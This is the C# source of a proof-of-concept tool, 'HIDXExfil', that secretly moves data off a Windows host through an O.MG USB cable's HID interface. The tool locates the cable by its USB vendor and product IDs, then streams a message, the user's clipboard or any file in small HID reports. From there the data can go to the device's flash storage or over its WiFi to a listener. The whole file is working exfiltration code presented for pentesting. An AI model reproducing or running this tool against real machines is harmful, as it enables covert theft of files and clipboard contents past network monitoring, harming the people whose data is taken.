/*	
Author: Ø1phor1³ (@01p8or13)
Acknowledgements: spiceywasabi, rogandawes, Kalani
	
https://github.com/0i41E
https://github.com/spiceywasabi
https://github.com/rogandawes
https://github.com/kalanihelekunihi

This is a POC.
A “low and slow” method of covert exfiltration meant to provide alternate pentesting pathways beyond using the target host’s network interfaces or mass storage.
This POC will allow data exfiltration back to the O.MG’s flash storage or act as a proxy between the target host and another device, 
via the O.MG Device's built-in WiFi interface, which can allow you to receive data via listeners like nc, netcat, or similar tools.

Credits to Rogan for the concept, idea of filehandle and device identification
*/

using System;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32.SafeHandles;
using System.Collections.Generic;

namespace HIDXExfil
{
    class Program
    {
        [STAThread] // Required for clipboard access
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                DefaultExecution();
                return;
            }

            string message = ""; // Message to exfiltrate
            string vendorID = "D3C0"; // Default Vendor ID
            string productID = "D34D"; // Default Product ID
            int chunksize = 8; // Default Chunk Size
            bool ClipboardExfil = false; // Exfiltrate Clipboard if set
            string filePath = ""; // File path for exfiltration

            // Valid parameters list
            HashSet<string> validParams = new HashSet<string> { "/message", "/clipboard", "/vid", "/pid", "/chunksize", "/file" };

            // Check for conflicting parameters
            bool messageSet = false;
            bool fileSet = false;

            // Parse command line arguments
            for (int i = 0; i < args.Length; i++)
            {
                if (!validParams.Contains(args[i].ToLower()))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Error: Invalid parameter '{args[i]}'");
                    Console.ResetColor();
                    DefaultExecution();
                    return;
                }

                string arg = args[i].ToLower();
                switch (arg)
                {
                    case "/message": // String to exfiltrate
                        if (i + 1 < args.Length)
                        {
                            if (messageSet || ClipboardExfil || fileSet)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("[!] Error: /message, /clipboard, and /file cannot be combined.");
                                Console.ResetColor();
                                return;
                            }
                            message = args[++i];
                            messageSet = true;
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: /message requires a value");
                            Console.ResetColor();
                            DefaultExecution();
                            return;
                        }
                        break;
                    case "/clipboard": // Read and exfil users clipboard
                        if (messageSet || ClipboardExfil || fileSet)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: /message, /clipboard, and /file cannot be combined.");
                            Console.ResetColor();
                            return;
                        }
                        ClipboardExfil = true;
                        break;
                    case "/vid": // Vendor ID
                        if (i + 1 < args.Length)
                        {
                            vendorID = args[++i];
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: /vid requires a value");
                            Console.ResetColor();
                            DefaultExecution();
                            return;
                        }
                        break;
                    case "/pid": // Product ID
                        if (i + 1 < args.Length)
                        {
                            productID = args[++i];
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: /pid requires a value");
                            Console.ResetColor();
                            DefaultExecution();
                            return;
                        }
                        break;
                    case "/chunksize": // Chunk Size
                        if (i + 1 < args.Length && int.TryParse(args[++i], out chunksize) && chunksize > 0)
                        {
                            // Valid chunk size
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: Invalid chunk size specified. Must be a positive integer.");
                            Console.ResetColor();
                            DefaultExecution();
                            return;
                        }
                        break;
                    case "/file": // File path to exfiltrate
                        if (i + 1 < args.Length)
                        {
                            if (messageSet || ClipboardExfil || fileSet)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("[!] Error: /message, /clipboard, and /file cannot be combined.");
                                Console.ResetColor();
                                return;
                            }
                            filePath = args[++i];
                            if (!File.Exists(filePath))
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("[!] Error: Specified file does not exist.");
                                Console.ResetColor();
                                DefaultExecution();
                                return;
                            }
                            fileSet = true;
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: /file requires a file path");
                            Console.ResetColor();
                            DefaultExecution();
                            return;
                        }
                        break;
                }
            }

            if (ClipboardExfil)
            {
                message = GetClipboardText();
                if (message == null)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: Could not read clipboard content - Clipboard might be empty");
                    Console.ResetColor();
                    return;
                }
            }

            string omg = $"{vendorID}&PID_{productID}";
            string devicestring = GetOMGDevice(omg);

            if (devicestring == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Error: Could not find OMG device - Check VID/PID");
                Console.ResetColor();
                return;
            }

            try
            {
                using (FileStream fileHandle = HIDX.Open(devicestring))
                {
                    if (fileHandle == null)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Error: Filehandle is empty");
                        Console.ResetColor();
                        return;
                    }

                    if (!string.IsNullOrEmpty(filePath))
                    {
                        FileInfo fileInfo = new FileInfo(filePath);
                        if (fileInfo.Length > 3072) // Check if file size is greater than 3KB for warning message
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("[?] Transfering files may take some time and can result in corrupted files.");
                            Console.ResetColor();
                        }
                        byte[] fileContent = File.ReadAllBytes(filePath);
                        SendMessage(fileHandle, fileContent, chunksize);
                    }
                    else
                    {
                          //byte[] payload = System.Text.Encoding.UTF8.GetBytes($"{message}\n");
			    byte[] payload = System.Text.Encoding.UTF8.GetBytes($"{message}\n");
                        SendMessage(fileHandle, payload, chunksize);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Error: {ex.Message}");
                Console.ResetColor();
            }
        }

        static string GetClipboardText()
        {
            try
            {
                return Clipboard.GetText();
            }
            catch (Exception)
            {
                return null;
            }
        }

        // ASCII Art and help menu when executed without parameters
        static void DefaultExecution()
        {
            string text = @"
 _   _ _____________   __  _____ _             _ _   _       _     _       _    
| | | |_   _|  _  \ \ / / /  ___| |           | | | | |     | |   (_)     | |   
| |_| | | | | | | |\ V /  \ `--.| |_ ___  __ _| | |_| |__   | |    _ _ __ | | __
|  _  | | | | | | |/   \   `--. \ __/ _ \/ _` | | __| '_ \  | |   | | '_ \| |/ /
| | | |_| |_| |/ // /^\ \ /\__/ / ||  __/ (_| | | |_| | | | | |___| | | | |   < 
\_| |_/\___/|___/ \/   \/ \____/ \__\___|\__,_|_|\__|_| |_| \_____/_|_| |_|_|\_\
";
            Console.WriteLine(text);
            Console.WriteLine("HID-Based Exfiltration Tool by Ø1phor1³");
            Console.WriteLine();
            Console.WriteLine("Usage: HIDXfil.exe /message <Message> /clipboard /file <File Path> /vid <VendorID> /pid <ProductID> /chunksize <chunksize>");
            Console.WriteLine();
            Console.WriteLine("Parameters:");
            Console.WriteLine("  /message:   Specify the message to exfiltrate");
            Console.WriteLine("  /clipboard: Exfiltrate the Users clipboard content");
            Console.WriteLine("  /file:      Specify the file path to exfiltrate");
            Console.WriteLine("  /vid:       Specify the Vendor ID of the target device (Optional - Default:D3C0)");
            Console.WriteLine("  /pid:       Specify the Product ID of the target device (Optional - Default:D34D)");
            Console.WriteLine("  /chunksize: Specify the chunk size for data transfer (Optional - Default:8)"); // Set to 8 for the best and most reliable experience
            Console.WriteLine();
            Console.WriteLine("Example: HIDXfil.exe /message \"Hello World\" /vid D3C0 /pid D34D /chunksize 8");
        }

        static string GetOMGDevice(string omg)
        {
            string devicestring = null;

            ManagementObjectCollection devices;
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_USBControllerDevice"))
            {
                devices = searcher.Get();
            }

            foreach (ManagementObject device in devices)
            {
                var dependent = device["Dependent"].ToString();
                var wmiDevice = new ManagementObject(dependent);

                if (wmiDevice["DeviceID"].ToString().Contains(omg) && wmiDevice["Service"] == null)
                {
                    devicestring = @"\\?\" + wmiDevice["DeviceID"].ToString().Replace(@"\", "#") + "#{4d1e55b2-f16f-11cf-88cb-001111000030}"; // GUID_DEVINTERFACE_HID
                    break;
                }
            }

            return devicestring;
        }

        // Chunking up message
        static void SendMessage(FileStream fileHandle, byte[] payload, int chunksize)
        {
            int payloadLength = payload.Length;
            int chunkNr = (int)Math.Ceiling((double)payloadLength / chunksize);

            for (int i = 0; i < chunkNr; i++)
            {
                byte[] bytes = new byte[65];
                int start = i * chunksize;
                int end = Math.Min((i + 1) * chunksize, payloadLength);
                int chunkLen = end - start;

                Buffer.BlockCopy(payload, start, bytes, 1, chunkLen);
                fileHandle.Write(bytes, 0, 65);
            }
        }
    }

    // Filehandle by Rogan
    public static class HIDX
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(
            string fileName,
            uint desiredAccess,
            int shareMode,
            IntPtr securityAttributes,
            int creationDisposition,
            uint flagsAndAttributes,
            IntPtr templateFile);

        public static FileStream Open(string fileName)
        {
            SafeFileHandle handle = CreateFile(
                fileName,
                0xC0000000,
                3,
                IntPtr.Zero,
                3,
                0x40000000,
                IntPtr.Zero);

            if (handle.IsInvalid)
            {
                throw new IOException($"Unable to open... {Marshal.GetLastWin32Error()}");
            }

            return new FileStream(handle, FileAccess.ReadWrite, 3, true);
        }
    }
}
